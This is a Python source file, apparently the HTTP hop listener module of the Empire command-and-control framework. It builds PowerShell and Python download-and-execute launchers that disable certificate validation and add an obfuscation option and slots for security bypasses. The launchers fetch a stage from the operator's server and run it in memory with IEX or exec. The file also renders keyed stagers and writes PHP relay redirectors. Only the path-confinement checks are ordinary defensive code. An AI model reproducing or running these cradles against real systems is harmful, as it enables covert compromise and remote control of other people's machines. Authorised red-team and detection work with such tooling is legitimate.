import base64
import logging
import secrets
from pathlib import Path
from textwrap import dedent

from cryptography.hazmat.primitives import serialization

from empire.server.common import helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.core.config import config_manager
from empire.server.core.exceptions import ListenerValidationException
from empire.server.utils import data_util, listener_util
from empire.server.utils.file_util import resolve_under_root

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


def _out_folder_root() -> Path:
    """The server-owned directory ``OutFolder`` is interpreted under.

    Resolved per call: ``config/data_manager.py`` rebinds
    ``config_manager.empire_config``, and this module is cached in
    ``sys.modules``, so a name bound at import time would freeze a stale config.
    """
    return config_manager.empire_config.directories.downloads / "http_hop"


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.mainMenu = mainMenu
        self.thread = None

    def post_init(self):
        self.host_address = None

        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self) -> None:
        """
        Validate all options for this listener.
        """
        root = _out_folder_root()
        if resolve_under_root(root, self.options["OutFolder"]["Value"]) is None:
            # Rejecting here, before persistence, is what keeps a poisoned
            # OutFolder out of models.Listener.options -- the boot loop re-runs
            # every enabled listener, so a stored escape would be replayed at
            # every startup. It is also the only place the operator gets the
            # real reason: start() can only answer False.
            raise ListenerValidationException(
                f"OutFolder must name a directory under {root}: give a path "
                f"relative to it, or an absolute path already inside it."
            )

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        language=None,
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/http_hop generate_launcher(): no language specified!")
            return None

        redirect_name = self.options["RedirectListener"]["Value"]
        listener = self.mainMenu.listenersv2.get_active_listener_by_name(redirect_name)
        launcher = self.options["Launcher"]["Value"]
        staging_key = self.options["RedirectStagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = secrets.choice(uris)
        cookie = listener.session_cookie

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'

            for bypass in bypasses:
                stager += bypass

            stager += "$wc=New-Object System.Net.WebClient;"

            if user_agent.lower() == "default":
                user_agent = profile.split("|")[1]
            stager += f"$u='{user_agent}';"

            if "https" in self.host_address:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            if user_agent.lower() != "none" or proxy.lower() != "none":
                if user_agent.lower() != "none":
                    stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"

                    else:
                        # TODO: implement form for other proxy
                        stager += "$proxy=New-Object Net.WebProxy;"
                        stager += f"$proxy.Address = '{proxy.lower()}';"
                        stager += "$wc.Proxy = $proxy;"

                    if proxy_creds.lower() == "default":
                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        # TODO: implement form for other proxy credentials
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                        stager += "$wc.Proxy.Credentials = $netcred;"

            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            # add the routing packet to a cookie
            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
            stager += "$wc.Headers.Add('Hop-Name',$hop);"
            stager += "$data=$wc.DownloadData($ser+$t);"

            # decode everything and kick it over to IEX to kick off execution
            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            # base64 encode the stager and return it
            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)
            # otherwise return the case-randomized stager
            return stager

        if language in ["python", "ironpython"]:
            # Python

            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += dedent(
                    """
                    import ssl;
                    if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                    """
                )
            for bypass in bypasses:
                launcherBase += bypass

            if user_agent.lower() == "default":
                user_agent = profile.split("|")[1]

            launcherBase += dedent(
                f"""
                import urllib.request;
                UA='{user_agent}';server='{self.host_address}';t='{stage0}';hop='{listener_name}';
                req=urllib.request.Request(server+t);
                req.add_header('Hop-Name', hop);
                """
            )

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"

                        # add the routing packet to a cookie
                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
                    else:
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += dedent(
                            f"""
                            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
                            proxy_auth_handler.add_password(None,'{proxy}','{username}','{password}');
                            o = urllib.request.build_opener(proxy, proxy_auth_handler);
                            o.addheaders=[('User-Agent',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];
                            """
                        )
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "data=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(staging_key)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        log.error(
            "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        redirect_name = listenerOptions["RedirectListener"]["Value"]
        listener = self.mainMenu.listenersv2.get_active_listener_by_name(redirect_name)

        profile = listener.options["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        staging_key = listener.options["StagingKey"]["Value"]
        workingHours = listener.options["WorkingHours"]["Value"]
        killDate = listener.options["KillDate"]["Value"]
        session_cookie = listener.options["Cookie"]["Value"]

        # select some random URIs for staging from the main profile
        stage1 = secrets.choice(uris)
        stage2 = secrets.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1.j2")
            custom_headers = listener_util.parse_custom_headers(profile)

            raw_key_bytes = listener.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )
            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            # Agent public key bytes for PS array
            raw_key_bytes = (
                listener.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            # Server public key bytes for PS array
            raw_key_bytes = (
                listener.server_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": staging_key,
                "profile": profile,
                "session_cookie": session_cookie,
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
                "agent_private_cert_key": private_key_array,
                "server_public_cert_key": server_public_key_array,
                "agent_public_cert_key": public_key_array,
                "custom_headers": custom_headers,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )

            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() in ["python", "ironpython"]:
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py.j2")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": staging_key,
                "agent_private_cert_key": listener.agent_private_cert_key,
                "server_public_cert_key": listener.server_public_cert_key,
                "agent_public_cert_key": listener.agent_public_cert_key,
                "profile": profile,
                "session_cookie": session_cookie,
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            if encode:
                return base64.b64encode(stager)

            return stager

        log.error(
            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        log.error("generate_agent() not implemented for listeners/http_hop")
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        if not language:
            log.error("listeners/http_hop generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.ps1.j2")
            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            template_options = {
                "session_cookie": "",
                "host": self.host_address,
                "agent_private_cert_key": powershell_array,
                "agent_public_cert_key": self.agent_public_cert_key,
                "custom_headers": listener_util.parse_custom_headers(
                    self.options["DefaultProfile"]["Value"]
                ),
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py.j2")

            template_options = {
                "session_cookie": "",
                "host": self.host_address,
            }

            return template.render(template_options)

        log.error(
            "listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def start(self):
        """
        Nothing to actually start for a hop listner, but ensure the stagingKey is
        synced with the redirect listener.
        """

        redirectListenerName = self.options["RedirectListener"]["Value"]
        redirectListenerOptions = data_util.get_listener_options(redirectListenerName)
        redirectHost = data_util.get_host_address(redirectListenerName)

        # start() must never raise: two of the three routes here do not wrap it,
        # and one of those is the boot loop that re-runs every enabled listener,
        # so an exception is a startup abort an operator can plant and walk away
        # from. Every rejection below is log + return False, matching the
        # RedirectListener miss above.
        if not redirectListenerOptions:
            log.error(
                f"Redirect listener name {redirectListenerName} not a valid listener!"
            )
            return False

        if not redirectHost:
            # models.Listener.host_address is nullable, and get_host_address()
            # swallows every DB failure into None -- so a transient error at boot
            # is enough. str.replace(x, None) is a TypeError, which would take out
            # the whole start_existing_listeners loop, not just this listener.
            log.error(
                f"listeners/http_hop start(): redirect listener {redirectListenerName} "
                "has no host address; refusing to write hop redirectors."
            )
            return False

        self.options["RedirectStagingKey"]["Value"] = redirectListenerOptions.options[
            "StagingKey"
        ]["Value"]
        self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
            "DefaultProfile"
        ]["Value"]

        uris = list(self.options["DefaultProfile"]["Value"].split("|")[0].split(","))

        try:
            hopCode = (self.mainMenu.install_path / "data/misc/hop.php").read_text(
                encoding="utf-8"
            )
        except OSError:
            log.exception(
                "listeners/http_hop start(): could not read data/misc/hop.php"
            )
            return False

        hopCode = hopCode.replace("REPLACE_SERVER", redirectHost)
        hopCode = hopCode.replace("REPLACE_HOP_NAME", self.options["Name"]["Value"])

        root = _out_folder_root()
        save_folder = resolve_under_root(root, self.options["OutFolder"]["Value"])
        if save_folder is None:
            log.error(
                f"listeners/http_hop start(): OutFolder must name a directory "
                f"under {root}; refusing to write hop redirectors."
            )
            return False

        # Resolve every URI before writing any of them. A DefaultProfile whose
        # second URI escapes would otherwise leave the first redirector on disk
        # under a listener that then reports failure -- a stale .php carrying the
        # old REPLACE_SERVER that the operator may still go and deploy.
        save_paths = []
        for uri in uris:
            # Confine the composed path, not just OutFolder: the URIs come from
            # the redirect listener's stored DefaultProfile, which is another
            # row, mutable after this listener was validated, and lstrip("/")
            # stops an absolute URI but not "..".
            save_path = resolve_under_root(save_folder, uri.lstrip("/"))
            if save_path is None:
                log.error(
                    f"listeners/http_hop start(): redirect listener URI {uri!r} "
                    f"does not name a file under {save_folder}; refusing to "
                    "write hop redirectors."
                )
                return False

            save_paths.append(save_path)

        for save_path in save_paths:
            try:
                save_path.parent.mkdir(parents=True, exist_ok=True)
                save_path.write_text(hopCode)
            except OSError:
                # Confined but unwritable: a component already taken by a
                # regular file, EACCES, ENOSPC. Without this the boot path takes
                # the exception.
                log.exception(
                    f"listeners/http_hop start(): could not write {save_path}"
                )
                return False

            log.info(
                f"Hop redirector written to {save_path} . Place this file on the redirect server."
            )

        return True

    def shutdown(self, name=""):
        """
        Nothing to actually shut down for a hop listener.
        """
        pass
